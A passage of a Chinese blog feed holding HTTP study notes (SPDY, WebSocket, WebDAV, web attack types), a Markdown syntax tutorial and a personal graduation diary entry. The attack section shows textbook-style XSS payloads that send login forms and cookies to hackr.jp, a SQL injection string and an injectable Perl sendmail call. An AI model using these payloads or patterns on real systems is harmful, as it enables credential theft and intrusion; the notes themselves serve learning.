href="#HTTP的瓶颈：" class="headerlink" title="HTTP的瓶颈："></a>HTTP的瓶颈：</h4><ul><li>一条连接上只可发送一个请求</li><li>请求只能从客户端开始，客户端不可以接收响应以外的指令</li><li>请求/响应首部未经压缩就发送，首部信息越多延迟越大</li><li>发送冗长的首部，每次互相发送相同的首部造成的浪费较多</li><li>可任意选择数据压缩格式，非强制压缩发送</li></ul><h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><ul><li>Ajax：异步请求实现局部刷新，但可能存在大量请求产生</li><li>Comet：一旦服务器内容更新了，可以立即反馈给客户端</li><li>SPDY：<blockquote><p>以会话层的形式加入，控制对数据的流动，但还是采用HTTP建立通信连接<br><code>HTTP</code> 应用层<br><code>SPDY</code> 会话层<br><code>SSL</code> 表示层<br><code>TCP</code> 传输层<br>多路复用流：通过单一的TCP连接，可以无限制处理多个HTTP请求<br>赋予请求优先级：可以给请求逐个分配优先级顺序<br>压缩HTTP首部：压缩HTTP请求和响应的首部<br>推送功能：支持服务器主动向客户端推送数据的功能<br>服务器提示功能：服务器可以主动提示客户端请求所需的资料</p></blockquote></li></ul><h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义:"></a>定义:</h4><ul><li>即Web浏览器与Web浏览器服务器之间全双工通信标准</li></ul><h4 id="特点"><a href="#特点" class="headerlink" title="特点:"></a>特点:</h4><ul><li>推送功能：支持由服务器向客户端推送数据的推送功能</li><li>减少通行量：只要建立起WebSocket连接，就希望一直保持连接状态</li></ul><h4 id="WebSocketAPI"><a href="#WebSocketAPI" class="headerlink" title="WebSocketAPI:"></a>WebSocketAPI:</h4><ul><li>JavaScript可调用API，实现WebSocket协议下全双工通信</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var socket = new WebSocket(&apos;ws://game.example.com:12010/updates&apos;);</span><br><span class="line">socket.onopen = function()&#123;</span><br><span class="line">    setInternal(function()&#123;</span><br><span class="line">        if(socket.bufferedAmout == 0)&#123;</span><br><span class="line">            socket.send(getUpdateData());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,50);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="WebDAV"><a href="#WebDAV" class="headerlink" title="WebDAV"></a>WebDAV</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义:"></a>定义:</h4><ul><li>WebDAV是一个可对Web服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统</li></ul><h4 id="引入概念"><a href="#引入概念" class="headerlink" title="引入概念:"></a>引入概念:</h4><ul><li>集合(Collection)：是一种统一管理多个资源的概念，以集合为单位可进行各种操作</li><li>资源(Resource)：把文件或集合称为资源</li><li>属性(Property)：定义资源的属性</li><li>锁(Lock)：把文件设置成无法编辑状态</li></ul><h4 id="新增方法及状态码"><a href="#新增方法及状态码" class="headerlink" title="新增方法及状态码:"></a>新增方法及状态码:</h4><ul><li>PROPFIND：获取属性</li><li>PROPPATCH：修改属性</li><li>MKCOL：创建集合</li><li>COPY：复制资源及属性</li><li>MOVE：移动资源</li><li>LOCK：资源加锁</li><li>UNLOCK：资源解锁</li></ul><table><thead><tr><th style="text-align:left">状态码</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">102 Processing</td><td style="text-align:left">可正常处理请求，但目前是处理中状态</td></tr><tr><td style="text-align:left">207 Multi-Status</td><td style="text-align:left">存在多种状态</td></tr><tr><td style="text-align:left">422 Unprocessible Entity</td><td style="text-align:left">格式正确，内容有误</td></tr><tr><td style="text-align:left">423 Locked</td><td style="text-align:left">资源已被加锁</td></tr><tr><td style="text-align:left">424 Failed Dependency</td><td style="text-align:left">处理与某请求关联的请求失败，因此不再维持依赖关系</td></tr><tr><td style="text-align:left">507 Insufficient Storage</td><td style="text-align:left">保存空间不足</td></tr></tbody></table><h2 id="Web的攻击技术"><a href="#Web的攻击技术" class="headerlink" title="Web的攻击技术"></a>Web的攻击技术</h2><h3 id="跨站脚本攻击-XSS"><a href="#跨站脚本攻击-XSS" class="headerlink" title="跨站脚本攻击(XSS)"></a>跨站脚本攻击(XSS)</h3><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击</li></ul><h4 id="造成影响"><a href="#造成影响" class="headerlink" title="造成影响:"></a>造成影响:</h4><ul><li>利用虚假输入表单骗取用户个人信息</li><li>利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求</li><li>显示伪造的文章或图片</li></ul><h4 id="攻击案例"><a href="#攻击案例" class="headerlink" title="攻击案例:"></a>攻击案例:</h4><ul><li>获取用户登录信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.jp/Login?ID=&quot;&gt;&lt;script&gt;var tf=document.getElemenById(&apos;login&apos;);tf.action=&apos;http://hackr.jp/pwget&apos;;tf.method=&apos;get&apos;;&lt;/script&gt;&lt;span ts=&quot;</span><br></pre></td></tr></table></figure><ul><li>对用户Cookie的窃取攻击</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.jp/login?ID=&quot;&gt;&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;&quot;</span><br><span class="line">xss.js文件：</span><br><span class="line">var content = escape(document.cookie);</span><br><span class="line">document.write(&quot;&lt;img src=http://hackr.jp/?&quot;);</span><br><span class="line">document.write(content);</span><br><span class="line">document.write(&quot;&gt;&quot;);</span><br></pre></td></tr></table></figure><h3 id="SQL攻击"><a href="#SQL攻击" class="headerlink" title="SQL攻击"></a>SQL攻击</h3><h4 id="定义-3"><a href="#定义-3" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指针对Web应用使用的数据库通过运行非法的SQL而产生的攻击</li></ul><h4 id="造成影响-1"><a href="#造成影响-1" class="headerlink" title="造成影响:"></a>造成影响:</h4><ul><li>非法查看或篡改数据库内的数据</li><li>规避认证</li><li>执行和数据库服务器业务关联的程序等</li></ul><h4 id="攻击案例-1"><a href="#攻击案例-1" class="headerlink" title="攻击案例:"></a>攻击案例:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/search?q=marry&apos;--</span><br><span class="line">select * from bookTbl where author=&quot;marry&quot; --&apos; and flag=1;</span><br></pre></td></tr></table></figure><h3 id="OS命令注入攻击"><a href="#OS命令注入攻击" class="headerlink" title="OS命令注入攻击"></a>OS命令注入攻击</h3><h4 id="定义-4"><a href="#定义-4" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指通过Web应用，执行非法的操作系统命令达到攻击的目的</li></ul><h4 id="攻击案例-2"><a href="#攻击案例-2" class="headerlink" title="攻击案例:"></a>攻击案例:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my $adr = $q -&gt; param(&apos;mailaddress&apos;);</span><br><span class="line">open(MAIL,&quot;|/user/sbin/senmail  $adr&quot;);</span><br><span class="line">print MAIL &quot;Form:info@example.com\n&quot;;</span><br></pre></td></tr></table></figure><h3 id="HTTP首部注入攻击"><a href="#HTTP首部注入攻击" class="headerlink" title="HTTP首部注入攻击"></a>HTTP首部注入攻击</h3><h4 id="定义-5"><a href="#定义-5" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击</li></ul><h3 id="邮件首部注入攻击"><a href="#邮件首部注入攻击" class="headerlink" title="邮件首部注入攻击"></a>邮件首部注入攻击</h3><h4 id="定义-6"><a href="#定义-6" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指Web应用中的邮件发送功能，攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击</li></ul><h3 id="目标遍历攻击"><a href="#目标遍历攻击" class="headerlink" title="目标遍历攻击"></a>目标遍历攻击</h3><h4 id="定义-7"><a href="#定义-7" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击</li></ul><h3 id="跨站点请求伪造-CSRF"><a href="#跨站点请求伪造-CSRF" class="headerlink" title="跨站点请求伪造(CSRF)"></a>跨站点请求伪造(CSRF)</h3><h4 id="定义-8"><a href="#定义-8" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新</li></ul><h3 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h3><h4 id="定义-9"><a href="#定义-9" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指利用透明的按钮或链接做成陷阱覆盖在Web页面之上</li></ul><h3 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h3><h4 id="定义-10"><a href="#定义-10" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是一种让运行中的服务呈停止状态的攻击</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;TCP-IP协议族&quot;&gt;&lt;a href=&quot;#TCP-IP协议族&quot; class=&quot;headerlink&quot; title=&quot;TCP/IP协议族&quot;&gt;&lt;/a&gt;TCP/IP协议族&lt;/h2&gt;&lt;h3 id=&quot;重要思想-分层&quot;&gt;&lt;a href=&quot;#重要思想-分层&quot; class=&quot;headerlink&quot; title=&quot;重要思想:分层&quot;&gt;&lt;/a&gt;重要思想:&lt;code&gt;分层&lt;/code&gt;&lt;/h3&gt;&lt;h3 id=&quot;分层：&quot;&gt;&lt;a href=&quot;#分层：&quot; class=&quot;headerlink&quot; title=&quot;分层：&quot;&gt;&lt;/a&gt;分层：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;应用层：&lt;blockquote&gt;
&lt;p&gt;HTTP协议：生成针对目标web服务器的HTTP请求报文。&lt;br&gt;FTP协议：文件传输协议。&lt;br&gt;DNS协议： 域名解析协议。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="HTTP" scheme="http://dangoying.ink/categories/HTTP/"/>
    
    
      <category term="HTTP" scheme="http://dangoying.ink/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>Markdown常用语法</title>
    <link href="http://dangoying.ink/Markdown%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95.html"/>
    <id>http://dangoying.ink/Markdown常用语法.html</id>
    <published>2018-03-30T15:04:22.000Z</published>
    <updated>2019-10-07T13:09:16.231Z</updated>
    
    <content type="html"><![CDATA[<h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>在Markdown中，标题一共分为六级，只需在文字前加上 <code>#</code> 即可，这类标题也可以选择闭合，闭合只是为了美观，由行首的井字符数量决定标题的阶数。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># h1</span><br><span class="line">## h2</span><br><span class="line">### h3</span><br><span class="line">#### h4</span><br><span class="line">##### h5</span><br><span class="line">###### h6</span><br></pre></td></tr></table></figure><h2 id="分级标题"><a href="#分级标题" class="headerlink" title="分级标题"></a>分级标题</h2><p>与标题作用类似，<code>=</code> 和 <code>-</code> 最少可只写一个，兼容性一般。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一级标题</span><br><span class="line">============</span><br><span class="line">二级标题</span><br><span class="line">------------</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>根据标题生成目录，兼容性一般，nexT主题已经开启自动生成目录。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[TOC]</span><br></pre></td></tr></table></figure><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>引用可以分为单行引用和多行引用（引用块），同时只要根据层次加上 <code>&gt;</code> 就可以实现嵌套引用，引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等。代码：</p><h3 id="单行式"><a href="#单行式" class="headerlink" title="单行式"></a>单行式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br></pre></td></tr></table></figure><p>效果：</p><blockquote><p>hello world!</p></blockquote><h3 id="多行式"><a href="#多行式" class="headerlink" title="多行式"></a>多行式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br><span class="line">brand new world!</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br><span class="line">&gt; brand new world!</span><br></pre></td></tr></table></figure><p>效果相同：</p><blockquote><p>hello world!<br>brand new world!</p></blockquote><h3 id="嵌套式"><a href="#嵌套式" class="headerlink" title="嵌套式"></a>嵌套式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br><span class="line">&gt;&gt; brand new world!</span><br></pre></td></tr></table></figure><p>效果：</p><blockquote><p>hello world!</p><blockquote><p>brand new world!</p></blockquote></blockquote><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>代码块可分为行内代码块和多行代码块。代码：</p><h3 id="行内代码"><a href="#行内代码" class="headerlink" title="行内代码"></a>行内代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;div&gt;&lt;/div&gt;`</span><br></pre></td></tr></table></figure><p>效果：<br><code>&lt;div&gt;&lt;/div&gt;</code></p><h3 id="代码块-1"><a href="#代码块-1" class="headerlink" title="代码块"></a>代码块</h3><p>用三个反引号包裹一串代码，或者使用Tab缩进。注意要空开一行书写。<br>效果：</p><pre><code>&lt;div&gt;       &lt;div&gt;&lt;/div&gt;    &lt;div&gt;&lt;/div&gt;    &lt;div&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><h3 id="自定义语法"><a href="#自定义语法" class="headerlink" title="自定义语法"></a>自定义语法</h3><p>该方法可以根据不同的语言配置不同的代码着色。(代码在使用的时候去掉前面的反斜杠，这里为了防止被编译而加上)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\```javascript</span><br><span class="line">var num = 0;</span><br><span class="line">for (var i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">    num+=i;</span><br><span class="line">&#125;</span><br><span class="line">\```console.log(num);</span><br></pre></td></tr></table></figure><p>效果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    num+=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(num);</span><br></pre></td></tr></table></figure><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>Markdown中支持两种列表：无序列表和有序列表。</p><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>无序列表有三种语法,可使用 <code>*</code> 、<code>+</code> 、 <code>-</code>作为列表标记。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*   Red</span><br><span class="line">*   Green</span><br><span class="line">*   Blue</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+   Red</span><br><span class="line">+   Green</span><br><span class="line">+   Blue</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-   Red</span><br><span class="line">-   Green</span><br><span class="line">-   Blue</span><br></pre></td></tr></table></figure><p>效果：</p><ul><li>Red</li><li>Green</li><li>Blue</li></ul><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>在列表标记上使用的数字并不会影响输出的 HTML 结果，即可以让 Markdown 文件的列表数字和输出的结果相同，也可以完全不用在意数字的正确性。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.  Bird</span><br><span class="line">2.  McHale</span><br><span class="line">3.  Parish</span><br></pre></td></tr></table></figure><p>效果：</p><ol><li>Bird</li><li>McHale</li><li>Parish</li></ol><h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* * *</span><br><span class="line"></span><br><span class="line">***</span><br><span class="line"></span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">- - -</span><br><span class="line"></span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure><p>效果：</p><hr><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>Markdown 支持两种形式的链接语法： 行内式和参考式两种形式。不管是哪一种，链接文字都是用 [方括号] 来标记。</p><h3 id="行内式"><a href="#行内式" class="headerlink" title="行内式"></a>行内式</h3><p>要建立一个行内式的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[an example](http://example.com/&quot;Title&quot;)&#123;:</span><br></pre></td></tr></table></figure><p>效果：<br><a href="http://example.com/&quot;Title&quot;" target="_blank" rel="noopener">an example</a></p><h3 id="参考式"><a href="#参考式" class="headerlink" title="参考式"></a>参考式</h3><p>该链接必须带 <code>http://</code> ，否则会被解析成本地路径，代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[an example][id]</span><br><span class="line">[id]: http://example.com/</span><br></pre></td></tr></table></figure><p>效果：<br><a href="http://example.com/" target="_blank" rel="noopener">an example</a></p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>Markdown 使用一种和链接很相似的语法来标记图片，和链接的主要区别在于在最开头需要标记 <code>!</code> 。同样分为行内式和参考式。</p><h3 id="行内式-1"><a href="#行内式-1" class="headerlink" title="行内式"></a>行内式</h3><p>方括号中用来放图片无法正常显示时的替代文字，代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![Alt text](../assets/blogImg/avatar.png)</span><br></pre></td></tr></table></figure><h3 id="参考式-1"><a href="#参考式-1" class="headerlink" title="参考式"></a>参考式</h3><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![Alt text][01]</span><br><span class="line">[01]: ../assets/blogImg/avatar.png</span><br></pre></td></tr></table></figure><p>效果：<br><img src="../assets/blogImg/2018-3-31.jpg" alt="Alt text"></p><h2 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h2><p>注意要空开一行书写。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- [x] 选项一</span><br><span class="line">- [ ] 选项二  </span><br><span class="line">- [ ]  [选项3]</span><br></pre></td></tr></table></figure><p>效果：</p><ul><li style="list-style: none"><input type="checkbox" checked> 选项一</li><li style="list-style: none"><input type="checkbox"> 选项二  </li><li style="list-style: none"><input type="checkbox"> 选项三</li></ul><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p><code>:</code> 代表对齐方式 , <code>:</code> 与 <code>|</code> 之间不要有空格，否则对齐会有些不兼容。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|    a    |       b       |      c     |</span><br><span class="line">|:-------:|:------------- | ----------:|</span><br><span class="line">|   居中  |     左对齐    |   右对齐   |</span><br><span class="line">|=========|===============|============|</span><br></pre></td></tr></table></figure><p>效果：</p><table><thead><tr><th style="text-align:center">a</th><th style="text-align:left">b</th><th style="text-align:right">c</th></tr></thead><tbody><tr><td style="text-align:center">居中</td><td style="text-align:left">左对齐</td><td style="text-align:right">右对齐</td></tr><tr><td style="text-align:center">=========</td><td style="text-align:left">===============</td><td style="text-align:right">============</td></tr></tbody></table><p>简约写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a | b | c  </span><br><span class="line">:-:|:- |-:</span><br><span class="line">    居中    |     左对齐      |   右对齐    </span><br><span class="line">============|=================|=============</span><br></pre></td></tr></table></figure><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><table><thead><tr><th style="text-align:center">描述</th><th style="text-align:center">效果</th><th style="text-align:center">代码</th></tr></thead><tbody><tr><td style="text-align:center">斜体</td><td style="text-align:center"><em>斜体</em></td><td style="text-align:center"><code>*斜体*</code></td></tr><tr><td style="text-align:center">斜体</td><td style="text-align:center"><em>斜体</em></td><td style="text-align:center"><code>_斜体_</code></td></tr><tr><td style="text-align:center">加粗</td><td style="text-align:center"><strong>加粗</strong></td><td style="text-align:center"><code>**加粗**</code></td></tr><tr><td style="text-align:center">加粗+斜体</td><td style="text-align:center"><strong><em>加粗+斜体</em></strong></td><td style="text-align:center"><code>***加粗+斜体***</code></td></tr><tr><td style="text-align:center">加粗+斜体</td><td style="text-align:center"><strong><em>加粗+斜体</em></strong></td><td style="text-align:center"><code>**_加粗+斜体_**</code></td></tr><tr><td style="text-align:center">删除线</td><td style="text-align:center"><del>删除线</del></td><td style="text-align:center"><code>~~删除线~~</code></td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;标题&quot;&gt;&lt;a href=&quot;#标题&quot; class=&quot;headerlink&quot; title=&quot;标题&quot;&gt;&lt;/a&gt;标题&lt;/h2&gt;&lt;p&gt;在Markdown中，标题一共分为六级，只需在文字前加上 &lt;code&gt;#&lt;/code&gt; 即可，这类标题也可以选择闭合，闭合只是为了美观，由行首的井字符数量决定标题的阶数。代码：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# h1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;## h2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;### h3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#### h4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;##### h5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;###### h6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;分级标题&quot;&gt;&lt;a href=&quot;#分级标题&quot; class=&quot;headerlink&quot; title=&quot;分级标题&quot;&gt;&lt;/a&gt;分级标题&lt;/h2&gt;&lt;p&gt;与标题作用类似，&lt;code&gt;=&lt;/code&gt; 和 &lt;code&gt;-&lt;/code&gt; 最少可只写一个，兼容性一般。代码：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;一级标题&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;============&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;二级标题&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;------------&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="语法" scheme="http://dangoying.ink/categories/%E8%AF%AD%E6%B3%95/"/>
    
    
      <category term="Markdown" scheme="http://dangoying.ink/tags/Markdown/"/>
    
  </entry>
  
  <entry>
    <title>人生这本书翻开新的一章</title>
    <link href="http://dangoying.ink/%E4%BA%BA%E7%94%9F%E8%BF%99%E6%9C%AC%E4%B9%A6%E7%BF%BB%E5%BC%80%E6%96%B0%E7%9A%84%E4%B8%80%E7%AB%A0.html"/>
    <id>http://dangoying.ink/人生这本书翻开新的一章.html</id>
    <published>2018-03-30T12:07:12.000Z</published>
    <updated>2018-03-30T15:02:26.615Z</updated>
    
    <content type="html"><![CDATA[<p><img src="./assets/blogImg/2018-3-30.jpg" alt=""><br><a id="more"></a><br>3月的尾巴，距离大学毕业还剩2个月左右的时间，昨晚和室友卧谈，聊起了在这个时间点，每个站在人生岔路口迷茫的我们。<br>最近考研、考公的都出了结果，漫长的备考过程，本期望着盼来好消息的两个室友却不得不面对与自己第一志愿失之交臂，在调剂亦或是就业中做出选择，当其他得到录取通知的同学开始整日整日放纵欢腾的时候，她们脸上是淡淡的笑，眼里却也有着对未来的迷茫。在和我一起逛过几次招聘会后，昨天其中一个室友说，她决定调剂，去一个离我们很远的地方继续她的学习生涯，说这话时，我能感觉到她隐隐的无奈，但也只能淡淡祝她好运，话题的最后，我仿佛听到自己内心一个声音问道：“这就是你当初不选择考研而是直接工作的原因吗？”<br>不是。去年的这个时候，当我做出这个决定周围经常会有人问“你成绩那么好，大学那么努力，为什么不考虑考研深造呢”，我不考研并不是因为我害怕最后会失败，而是我清楚的知道自己想要什么，即使学生时代那么让人留恋，但明确知道自己想做一名优秀程序媛的我，需要更多的是实践动手能力，在公司中不断参与项目的开发能更快提升我的能力，虽然一个更高的学历可能会为我在就业上扫除很多障碍，就不会像现在的我这样有些无助。不愿离开学生时代，倒不如说是不愿离开象牙塔。但是不管是哪一个选择都已经是过去式，与其缅怀过去不如立足当下。<br>现在的不顺利，是之前的准备不充分，机会是给有准备的人的这句话，不是失败者拿来自我安慰，所幸学习这件事，不管何时开始都不算晚，为了让自己更优秀，让自己成为HR眼中合适的人，让自己离自己的目标越来越接近，就从这篇博文开始，找回那个热血的自己。嘴上立志轻松容易，但学习却是持之以恒，愿自己初心莫负。</p><p>——<em>2018年3月30日于杭州师范大学</em></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;./assets/blogImg/2018-3-30.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
